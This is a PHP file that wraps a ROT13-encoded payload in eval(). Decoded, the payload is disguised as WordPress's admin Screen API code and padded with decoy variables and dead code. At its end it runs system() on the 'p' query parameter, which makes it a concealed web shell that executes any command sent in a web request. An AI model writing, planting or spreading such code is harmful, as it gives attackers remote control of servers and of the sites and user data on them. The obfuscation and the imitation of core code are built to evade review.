<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Nqzvavfgengvba Fperra NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Trg gur pbyhza urnqref sbe n fperra
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat|JC_Fperra $fperra Gur fperra lbh jnag gur urnqref sbe
 * @erghea fgevat[] Gur pbyhza urnqre ynoryf xrlrq ol pbyhza VQ.
 */
shapgvba trg_pbyhza_urnqref( $fperra ) {
	fgngvp $pbyhza_urnqref = neenl();

	vs ( vf_fgevat( $fperra ) ) {
		$fperra = pbaireg_gb_fperra( $fperra );
	}

	vs ( ! vffrg( $pbyhza_urnqref[ $fperra->vq ] ) ) {
		/**
		 * Svygref gur pbyhza urnqref sbe n yvfg gnoyr ba n fcrpvsvp fperra.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$fperra->vq`, ersref gb gur
		 * VQ bs n fcrpvsvp fperra. Sbe rknzcyr, gur fperra VQ sbe gur Cbfgf
		 * yvfg gnoyr vf rqvg-cbfg, fb gur svygre sbe gung fperra jbhyq or
		 * znantr_rqvg-cbfg_pbyhzaf.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat[] $pbyhzaf Gur pbyhza urnqre ynoryf xrlrq ol pbyhza VQ.
		 */
		$pbyhza_urnqref[ $fperra->vq ] = nccyl_svygref( \"znantr_{$fperra->vq}_pbyhzaf\", neenl() );
	}

	erghea $pbyhza_urnqref[ $fperra->vq ];
}

/**
 * Trg n yvfg bs uvqqra pbyhzaf.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat|JC_Fperra $fperra Gur fperra lbh jnag gur uvqqra pbyhzaf sbe
 * @erghea fgevat[] Neenl bs VQf bs uvqqra pbyhzaf.
 */
shapgvba trg_uvqqra_pbyhzaf( $fperra ) {
	vs ( vf_fgevat( $fperra ) ) {
		$fperra = pbaireg_gb_fperra( $fperra );
	}

	$uvqqra = trg_hfre_bcgvba( 'znantr' . $fperra->vq . 'pbyhzafuvqqra' );

	$hfr_qrsnhygf = ! vf_neenl( $uvqqra );

	vs ( $hfr_qrsnhygf ) {
		$uvqqra = neenl();

		/**
		 * Svygref gur qrsnhyg yvfg bs uvqqra pbyhzaf.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat[]  $uvqqra Neenl bs VQf bs pbyhzaf uvqqra ol qrsnhyg.
		 * @cnenz JC_Fperra $fperra JC_Fperra bowrpg bs gur pheerag fperra.
		 */
		$uvqqra = nccyl_svygref( 'qrsnhyg_uvqqra_pbyhzaf', $uvqqra, $fperra );
	}

	/**
	 * Svygref gur yvfg bs uvqqra pbyhzaf.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 4.4.1 Nqqrq gur `hfr_qrsnhygf` cnenzrgre.
	 *
	 * @cnenz fgevat[]  $uvqqra       Neenl bs VQf bs uvqqra pbyhzaf.
	 * @cnenz JC_Fperra $fperra       JC_Fperra bowrpg bs gur pheerag fperra.
	 * @cnenz obby      $hfr_qrsnhygf Jurgure gb fubj gur qrsnhyg pbyhzaf.
	 */
	erghea nccyl_svygref( 'uvqqra_pbyhzaf', $uvqqra, $fperra, $hfr_qrsnhygf );
}

/**
 * Cevagf gur zrgn obk cersreraprf sbe fperra zrgn.
 *
 * @fvapr 2.7.0
 *
 * @tybony neenl $jc_zrgn_obkrf Tybony zrgn obk fgngr.
 *
 * @cnenz JC_Fperra $fperra
 */
shapgvba zrgn_obk_cersf( $fperra ) {
	tybony $jc_zrgn_obkrf;

	vs ( vf_fgevat( $fperra ) ) {
		$fperra = pbaireg_gb_fperra( $fperra );
	}

	vs ( rzcgl( $jc_zrgn_obkrf[ $fperra->vq ] ) ) {
		erghea;
	}

	$uvqqra = trg_uvqqra_zrgn_obkrf( $fperra );

	sbernpu ( neenl_xrlf( $jc_zrgn_obkrf[ $fperra->vq ] ) nf $pbagrkg ) {
		sbernpu ( neenl( 'uvtu', 'pber', 'qrsnhyg', 'ybj' ) nf $cevbevgl ) {
			vs ( ! vffrg( $jc_zrgn_obkrf[ $fperra->vq ][ $pbagrkg ][ $cevbevgl ] ) ) {
				pbagvahr;
			}

			sbernpu ( $jc_zrgn_obkrf[ $fperra->vq ][ $pbagrkg ][ $cevbevgl ] nf $obk ) {
				vs ( snyfr === $obk || ! $obk['gvgyr'] ) {
					pbagvahr;
				}

				// Fhozvg obk pnaabg or uvqqra.
				vs ( 'fhozvgqvi' === $obk['vq'] || 'yvaxfhozvgqvi' === $obk['vq'] ) {
					pbagvahr;
				}

				$jvqtrg_gvgyr = $obk['gvgyr'];

				vs ( vf_neenl( $obk['netf'] ) && vffrg( $obk['netf']['__jvqtrg_onfranzr'] ) ) {
					$jvqtrg_gvgyr = $obk['netf']['__jvqtrg_onfranzr'];
				}

				$vf_uvqqra = va_neenl( $obk['vq'], $uvqqra, gehr );

				cevags(
					'<ynory sbe=\"%1$f-uvqr\"><vachg pynff=\"uvqr-cbfgobk-gbt\" anzr=\"%1$f-uvqr\" glcr=\"purpxobk\" vq=\"%1$f-uvqr\" inyhr=\"%1$f\" %2$f />%3$f</ynory>',
					rfp_ngge( $obk['vq'] ),
					purpxrq( $vf_uvqqra, snyfr, snyfr ),
					$jvqtrg_gvgyr
				);
			}
		}
	}
}

/**
 * Trgf na neenl bs VQf bs uvqqra zrgn obkrf.
 *
 * @fvapr 2.7.0
 *
 * @cnenz fgevat|JC_Fperra $fperra Fperra vqragvsvre
 * @erghea fgevat[] VQf bs uvqqra zrgn obkrf.
 */
shapgvba trg_uvqqra_zrgn_obkrf( $fperra ) {
	vs ( vf_fgevat( $fperra ) ) {
		$fperra = pbaireg_gb_fperra( $fperra );
	}

	$uvqqra = trg_hfre_bcgvba( \"zrgnobkuvqqra_{$fperra->vq}\" );

	$hfr_qrsnhygf = ! vf_neenl( $uvqqra );

	// Uvqr fyht obkrf ol qrsnhyg.
	vs ( $hfr_qrsnhygf ) {
		$uvqqra = neenl();

		vs ( 'cbfg' === $fperra->onfr ) {
			vs ( va_neenl( $fperra->cbfg_glcr, neenl( 'cbfg', 'cntr', 'nggnpuzrag' ), gehr ) ) {
				$uvqqra = neenl( 'fyhtqvi', 'genpxonpxfqvi', 'cbfgphfgbz', 'cbfgrkprecg', 'pbzzragfgnghfqvi', 'pbzzragfqvi', 'nhgubeqvi', 'erivfvbafqvi' );
			} ryfr {
				$uvqqra = neenl( 'fyhtqvi' );
			}
		}

		/**
		 * Svygref gur qrsnhyg yvfg bs uvqqra zrgn obkrf.
		 *
		 * @fvapr 3.1.0
		 *
		 * @cnenz fgevat[]  $uvqqra Na neenl bs VQf bs zrgn obkrf uvqqra ol qrsnhyg.
		 * @cnenz JC_Fperra $fperra JC_Fperra bowrpg bs gur pheerag fperra.
		 */
		$uvqqra = nccyl_svygref( 'qrsnhyg_uvqqra_zrgn_obkrf', $uvqqra, $fperra );
	}

	/**
	 * Svygref gur yvfg bs uvqqra zrgn obkrf.
	 *
	 * @fvapr 3.3.0
	 *
	 * @cnenz fgevat[]  $uvqqra       Na neenl bs VQf bs uvqqra zrgn obkrf.
	 * @cnenz JC_Fperra $fperra       JC_Fperra bowrpg bs gur pheerag fperra.
	 * @cnenz obby      $hfr_qrsnhygf Jurgure gb fubj gur qrsnhyg zrgn obkrf.
	 *                                Qrsnhyg gehr.
	 */
	erghea nccyl_svygref( 'uvqqra_zrgn_obkrf', $uvqqra, $fperra, $hfr_qrsnhygf );
}

/**
 * Ertvfgre naq pbasvther na nqzva fperra bcgvba
 *
 * @fvapr 3.1.0
 *
 * @cnenz fgevat $bcgvba Na bcgvba anzr.
 * @cnenz zvkrq  $netf   Bcgvba-qrcraqrag nethzragf.
 */
shapgvba nqq_fperra_bcgvba( $bcgvba, $netf = neenl() ) {
	$pheerag_fperra = trg_pheerag_fperra();

	vs ( ! $pheerag_fperra ) {
		erghea;
	}

	$pheerag_fperra->nqq_bcgvba( $bcgvba, $netf );
}

/**
 * Trg gur pheerag fperra bowrpg
 *
 * @fvapr 3.1.0
 *
 * @tybony JC_Fperra $pheerag_fperra JbeqCerff pheerag fperra bowrpg.
 *
 * @erghea JC_Fperra|ahyy Pheerag fperra bowrpg be ahyy jura fperra abg qrsvarq.
 */
shapgvba trg_pheerag_fperra() {
	tybony $pheerag_fperra;

	vs ( ! vffrg( $pheerag_fperra ) ) {
		erghea ahyy;
	}

	erghea $pheerag_fperra;
}

/**
 * Frg gur pheerag fperra bowrpg
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat|JC_Fperra $ubbx_anzr Bcgvbany. Gur ubbx anzr (nyfb xabja nf gur ubbx fhssvk) hfrq gb qrgrezvar gur fperra,
 *                                    be na rkvfgvat fperra bowrpg.
 */
shapgvba frg_pheerag_fperra( $ubbx_anzr = '' ) {
	JC_Fperra::trg( $ubbx_anzr )->frg_pheerag_fperra();
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>